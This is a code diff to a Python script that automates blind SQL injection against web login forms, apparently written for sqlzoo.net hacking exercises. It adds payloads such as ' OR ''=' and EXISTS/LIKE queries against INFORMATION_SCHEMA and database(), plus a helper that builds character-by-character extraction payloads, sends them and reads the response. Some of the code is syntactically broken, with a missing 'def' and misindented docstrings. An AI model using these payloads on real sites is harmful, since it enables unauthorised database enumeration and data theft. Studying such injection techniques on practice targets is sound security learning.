@@ -348,6 +348,12 @@ def NamePasswordDictionary(payload, username, password):
 def isVulnerable(url):
    """returns true if site is vulnerable to sql injections. Customize parser function (readQuery) to work for other sites.
 
+   Args:
+      url: string
+         url of potentially vulnerable form
+
+   Returns:
+      boolean: true if found to be vulnerable to SQL injection vulnerabilities
 
    """
    payload = "' OR ''='"
@@ -356,11 +362,58 @@ def isVulnerable(url):
    return readQuery(txt)
 
 def characterInTableName():
-   """
+"""
    https://sqlzoo.net/hack/24table.htm
+Is there a table called one in database test?
+    "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='test' AND TABLE_NAME='one') AND ''='"
 
-   """
+   
 
+"""
+   pass
+
+
+nTablesMatch():
+""" how many tables match
+
+Is there more than one table in the database(s) containing a j?
+    "' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '%j%')>1 AND ''='"
+
+"""   
+   pass
+
+
+def characterInDatabaseName(ch, url, index = "no index"):
+"""
+   a c
+Does the current database contain the letter j?
+   "' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '%j%') AND ''='"
+
+"""
+   payload = constructDatabaseQuery(ch, url, index)
+   payload = NamePasswordDictionary(payload, "name", "password")
+   txt = sendQuery(payload, url)
+   return readQuery(txt)
+
+
+
+
+def constructDatabaseQuery(ch, url, index = "no index"):
+"""helper function for characterInDatabaseName"""
+   payload = "' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '" 
+
+   nameStr = ""
+
+   if(index == "no index"):
+      nameStr += "%" + ch + "%"
+   elif(index >= 0):
+      nameStr += index * "_" + ch
+   else:
+      index = -1 * index -1
+      nameStr += "%" + ch + index * "_"
+
+   payload += nameStr + "') AND ''='"
+   return payload
 
 """
 links:
